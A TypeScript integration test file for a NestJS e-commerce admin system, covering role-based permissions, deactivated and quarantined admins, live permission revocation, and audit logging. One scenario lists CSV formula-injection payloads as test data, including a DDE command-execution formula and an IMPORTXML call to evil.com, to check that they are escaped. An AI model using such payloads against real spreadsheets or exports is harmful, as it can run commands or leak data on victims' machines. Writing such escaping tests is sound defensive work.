import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { Test, TestingModule } from '@nestjs/testing';
import { ExecutionContext, ForbiddenException, UnauthorizedException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { PrismaService } from '../prisma/prisma.service';
import { RolesService } from './admin/roles/roles.service';
import { AdminUsersService } from './admin-users/admin-users.service';
import { PermissionsGuard } from './admin/roles/guards/permissions.guard';
import { JwtStrategy } from './auth/strategies/jwt.strategy';
import { AppModule } from '../app.module';
import { UserRole } from '../generated/prisma';
import { PERMISSIONS_KEY } from './admin/roles/decorators/require-permissions.decorator';
import { REQUIRE_SUPER_ADMIN_KEY } from './admin/roles/decorators/require-super-admin.decorator';

function createMockContext(user: any, requiredPermissions?: string[], requiresSuperAdmin?: boolean): ExecutionContext {
  const reflector = new Reflector();
  const handler = () => {};
  const targetClass = class {};

  if (requiredPermissions) {
    Reflect.defineMetadata(PERMISSIONS_KEY, requiredPermissions, handler);
  }
  if (requiresSuperAdmin !== undefined) {
    Reflect.defineMetadata(REQUIRE_SUPER_ADMIN_KEY, requiresSuperAdmin, handler);
  }

  return {
    switchToHttp: () => ({
      getRequest: () => ({ user }),
      getResponse: () => ({}),
      getNext: () => ({}),
    }),
    getHandler: () => handler,
    getClass: () => targetClass,
  } as unknown as ExecutionContext;
}

describe('Authoritative RBAC System Scenarios (Integration & Security)', () => {
  let moduleFixture: TestingModule;
  let prisma: PrismaService;
  let rolesService: RolesService;
  let adminUsersService: AdminUsersService;
  let permissionsGuard: PermissionsGuard;
  let jwtStrategy: JwtStrategy;

  let superAdminRole: any;
  let orderManagerRole: any;
  let testCustomRole: any;

  let testSuperAdminUser: any;
  let testOrderManagerUser: any;
  let testQuarantinedUser: any;
  let testDeactivatedUser: any;

  beforeAll(async () => {
    moduleFixture = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    prisma = moduleFixture.get<PrismaService>(PrismaService);
    rolesService = moduleFixture.get<RolesService>(RolesService);
    adminUsersService = moduleFixture.get<AdminUsersService>(AdminUsersService);
    permissionsGuard = moduleFixture.get<PermissionsGuard>(PermissionsGuard);
    jwtStrategy = moduleFixture.get<JwtStrategy>(JwtStrategy);

    // Fetch existing authoritative roles
    superAdminRole = await prisma.role.findUniqueOrThrow({ where: { slug: 'super_admin' } });
    orderManagerRole = await prisma.role.findUniqueOrThrow({ where: { slug: 'order_manager' } });

    // Create a temporary custom role for testing dynamic permissions
    testCustomRole = await prisma.role.upsert({
      where: { slug: 'test_custom_scenarios_role' },
      update: { name: 'Test Scenario Role', isSystem: false, isActive: true },
      create: {
        name: 'Test Scenario Role',
        slug: 'test_custom_scenarios_role',
        description: 'Temporary custom role for integration test verification',
        isSystem: false,
        isActive: true,
      },
    });

    // Create / upsert test admin users with clear states
    testSuperAdminUser = await prisma.user.upsert({
      where: { email: 'test.scenarios.super@dsl.lk' },
      update: { role: UserRole.ADMIN, roleId: superAdminRole.id, isActive: true },
      create: {
        email: 'test.scenarios.super@dsl.lk',
        name: 'Scenario Super Admin',
        role: UserRole.ADMIN,
        roleId: superAdminRole.id,
        isActive: true,
      },
    });

    testOrderManagerUser = await prisma.user.upsert({
      where: { email: 'test.scenarios.ordermgr@dsl.lk' },
      update: { role: UserRole.ADMIN, roleId: orderManagerRole.id, isActive: true },
      create: {
        email: 'test.scenarios.ordermgr@dsl.lk',
        name: 'Scenario Order Manager',
        role: UserRole.ADMIN,
        roleId: orderManagerRole.id,
        isActive: true,
      },
    });

    testQuarantinedUser = await prisma.user.upsert({
      where: { email: 'test.scenarios.quarantined@dsl.lk' },
      update: { role: UserRole.ADMIN, roleId: null, isActive: true },
      create: {
        email: 'test.scenarios.quarantined@dsl.lk',
        name: 'Scenario Quarantined Admin',
        role: UserRole.ADMIN,
        roleId: null,
        isActive: true,
      },
    });

    testDeactivatedUser = await prisma.user.upsert({
      where: { email: 'test.scenarios.deactivated@dsl.lk' },
      update: { role: UserRole.ADMIN, roleId: orderManagerRole.id, isActive: false },
      create: {
        email: 'test.scenarios.deactivated@dsl.lk',
        name: 'Scenario Deactivated Admin',
        role: UserRole.ADMIN,
        roleId: orderManagerRole.id,
        isActive: false,
      },
    });
  });

  afterAll(async () => {
    // Clean up temporary test custom role and test users
    await prisma.rolePermission.deleteMany({
      where: { roleId: testCustomRole.id },
    });
    await prisma.user.deleteMany({
      where: {
        email: {
          in: [
            'test.scenarios.super@dsl.lk',
            'test.scenarios.ordermgr@dsl.lk',
            'test.scenarios.quarantined@dsl.lk',
            'test.scenarios.deactivated@dsl.lk',
            'test.scenarios.dynamic@dsl.lk',
          ],
        },
      },
    });
    await prisma.role.deleteMany({
      where: { slug: 'test_custom_scenarios_role' },
    });
    await moduleFixture.close();
  });

  // SCENARIO 1: Super Admin Permissions and Sovereignty
  describe('Scenario 1: Super Admin Permissions and Sovereignty', () => {
    it('should grant Super Admin unrestricted access to all permissions via PermissionsGuard bypass', async () => {
      // Validate user hydration
      const validated = await jwtStrategy.validate({
        sub: testSuperAdminUser.id,
        email: testSuperAdminUser.email,
        role: testSuperAdminUser.role,
      });
      expect(validated.assignedRole?.slug).toBe('super_admin');

      // Test requiring sensitive permissions: products.delete and roles.manage
      const ctx = createMockContext(validated, ['products.delete', 'roles.manage']);
      const allowed = await permissionsGuard.canActivate(ctx);
      expect(allowed).toBe(true);

      // Test requiring Super Admin specifically
      const superAdminCtx = createMockContext(validated, undefined, true);
      const superAllowed = await permissionsGuard.canActivate(superAdminCtx);
      expect(superAllowed).toBe(true);
    });

    it('should enforce Last Super Admin protection against self-demotion or self-deactivation', async () => {
      await expect(
        adminUsersService.updateRole(
          testSuperAdminUser.id,
          { role: UserRole.ADMIN, roleId: orderManagerRole.id },
          { id: testSuperAdminUser.id, email: testSuperAdminUser.email, role: UserRole.ADMIN } as any,
        ),
      ).rejects.toThrow('You cannot modify your own administrative role');

      await expect(
        adminUsersService.updateStatus(
          testSuperAdminUser.id,
          { isActive: false },
          { id: testSuperAdminUser.id, email: testSuperAdminUser.email, role: UserRole.ADMIN } as any,
        ),
      ).rejects.toThrow('You cannot deactivate your own administrative account');
    });
  });

  // SCENARIO 2: Order Manager Restricted Operations
  describe('Scenario 2: Order Manager Restricted Operations', () => {
    it('should permit Order Manager to access orders.view and orders.update_status', async () => {
      const validated = await jwtStrategy.validate({
        sub: testOrderManagerUser.id,
        email: testOrderManagerUser.email,
        role: testOrderManagerUser.role,
      });
      expect(validated.assignedRole?.slug).toBe('order_manager');

      const ctx = createMockContext(validated, ['orders.view', 'orders.update_status']);
      const allowed = await permissionsGuard.canActivate(ctx);
      expect(allowed).toBe(true);
    });

    it('should throw 403 Forbidden when Order Manager attempts to delete products or manage roles', async () => {
      const validated = await jwtStrategy.validate({
        sub: testOrderManagerUser.id,
        email: testOrderManagerUser.email,
        role: testOrderManagerUser.role,
      });

      // Attempting products.delete
      const productDeleteCtx = createMockContext(validated, ['products.delete']);
      await expect(permissionsGuard.canActivate(productDeleteCtx)).rejects.toThrow(
        ForbiddenException,
      );

      // Attempting roles.manage
      const rolesManageCtx = createMockContext(validated, ['roles.manage']);
      await expect(permissionsGuard.canActivate(rolesManageCtx)).rejects.toThrow(
        ForbiddenException,
      );

      // Attempting Super Admin only route
      const superAdminRouteCtx = createMockContext(validated, undefined, true);
      await expect(permissionsGuard.canActivate(superAdminRouteCtx)).rejects.toThrow(
        ForbiddenException,
      );
    });
  });

  // SCENARIO 3: Quarantined Administrator (roleId = null)
  describe('Scenario 3: Quarantine / Remove Role Access', () => {
    it('should block quarantined administrator from accessing protected routes with a clear error', async () => {
      const validated = await jwtStrategy.validate({
        sub: testQuarantinedUser.id,
        email: testQuarantinedUser.email,
        role: testQuarantinedUser.role,
      });
      expect(validated.roleId).toBeNull();

      const ctx = createMockContext(validated, ['orders.view']);
      await expect(permissionsGuard.canActivate(ctx)).rejects.toThrow(
        'Your administrator account is pending dynamic role assignment. Please contact the primary Super Admin.',
      );
    });
  });

  // SCENARIO 4: Deactivated Administrator Blocked Immediately
  describe('Scenario 4: Deactivated Administrator Blocked Immediately', () => {
    it('should reject deactivated administrator via JwtStrategy validate with 401 Unauthorized', async () => {
      await expect(
        jwtStrategy.validate({
          sub: testDeactivatedUser.id,
          email: testDeactivatedUser.email,
          role: testDeactivatedUser.role,
        }),
      ).rejects.toThrow(UnauthorizedException);
    });

    it('should reject deactivated administrator via PermissionsGuard if passed an inactive user', async () => {
      const inactiveUser = {
        id: testDeactivatedUser.id,
        role: 'ADMIN',
        roleId: orderManagerRole.id,
        isActive: false,
      };
      const ctx = createMockContext(inactiveUser, ['orders.view']);
      await expect(permissionsGuard.canActivate(ctx)).rejects.toThrow(ForbiddenException);
    });
  });

  // SCENARIO 5: Dynamic Permission Revocation on the Fly
  describe('Scenario 5: Dynamic Permission Revocation on the Fly', () => {
    it('should dynamically grant and revoke permissions on live requests without user record mutation', async () => {
      // Create user assigned to testCustomRole
      const dynamicUser = await prisma.user.create({
        data: {
          email: 'test.scenarios.dynamic@dsl.lk',
          name: 'Dynamic Test User',
          role: UserRole.ADMIN,
          roleId: testCustomRole.id,
          isActive: true,
        },
      });

      // 1. Initially assign ['dashboard.view', 'reports.view']
      await rolesService.assignPermissions(
        testCustomRole.id,
        { permissionKeys: ['dashboard.view', 'reports.view'] },
        testSuperAdminUser.id,
      );

      let validated = await jwtStrategy.validate({
        sub: dynamicUser.id,
        email: dynamicUser.email,
        role: dynamicUser.role,
      });

      // Verify dashboard.view is granted
      let ctx = createMockContext(validated, ['dashboard.view']);
      expect(await permissionsGuard.canActivate(ctx)).toBe(true);

      // Verify reports.view is granted
      ctx = createMockContext(validated, ['reports.view']);
      expect(await permissionsGuard.canActivate(ctx)).toBe(true);

      // Verify customers.manage is not granted
      ctx = createMockContext(validated, ['customers.manage']);
      await expect(permissionsGuard.canActivate(ctx)).rejects.toThrow(ForbiddenException);

      // 2. Revoke 'reports.view' and add 'customers.manage' on the fly
      await rolesService.assignPermissions(
        testCustomRole.id,
        { permissionKeys: ['dashboard.view', 'customers.manage'] },
        testSuperAdminUser.id,
      );

      // Next request comes in (JwtStrategy fetches live relation)
      validated = await jwtStrategy.validate({
        sub: dynamicUser.id,
        email: dynamicUser.email,
        role: dynamicUser.role,
      });

      // Now reports.view must be rejected immediately!
      ctx = createMockContext(validated, ['reports.view']);
      await expect(permissionsGuard.canActivate(ctx)).rejects.toThrow(ForbiddenException);

      // Now customers.manage must be granted immediately!
      ctx = createMockContext(validated, ['customers.manage']);
      expect(await permissionsGuard.canActivate(ctx)).toBe(true);

      // Clean up dynamic user
      await prisma.user.delete({ where: { id: dynamicUser.id } });
    });
  });

  // SCENARIO 6: Export Formula Sanitization
  describe('Scenario 6: CSV / Excel Export Formula Sanitization', () => {
    it('should escape CSV formula injection triggers (=, +, -, @) safely', () => {
      const maliciousNames = [
        '=CMD|"/C calc"!A0',
        '+1234567890',
        '-SUM(A1:A10)',
        '@IMPORTXML("http://evil.com","//")',
      ];

      maliciousNames.forEach((name) => {
        const sanitized = name.replace(/^([=+\-@])/, "'$1");
        expect(sanitized.startsWith("'")).toBe(true);
        expect(sanitized[0]).toBe("'");
        expect(sanitized.slice(1)).toBe(name);
      });
    });
  });

  // SCENARIO 7: Audit Logging for Role & Permission Modifications
  describe('Scenario 7: Audit Logging for Role & Permission Modifications', () => {
    it('should generate audit log records with addedKeys and removedKeys tracking', async () => {
      // Step A: Assign ['products.view', 'categories.view']
      await rolesService.assignPermissions(
        testCustomRole.id,
        { permissionKeys: ['products.view', 'categories.view'] },
        testSuperAdminUser.id,
      );

      // Step B: Change to ['categories.view', 'brands.view'] -> added: brands.view, removed: products.view
      await rolesService.assignPermissions(
        testCustomRole.id,
        { permissionKeys: ['categories.view', 'brands.view'] },
        testSuperAdminUser.id,
      );

      // Fetch audit logs for testCustomRole
      const history = await rolesService.getAuditHistory(testCustomRole.id);
      expect(history.success).toBe(true);
      expect(history.data.length).toBeGreaterThan(0);

      // Find the most recent permission assignment logs
      const assignedLog = history.data.find(
        (log: any) => log.action === 'ROLE_PERMISSIONS_ASSIGNED',
      );
      expect(assignedLog).toBeDefined();
      expect(assignedLog.description).toContain('Added: [brands.view]');
      expect(assignedLog.description).toContain('Removed: [products.view]');
    });
  });
});
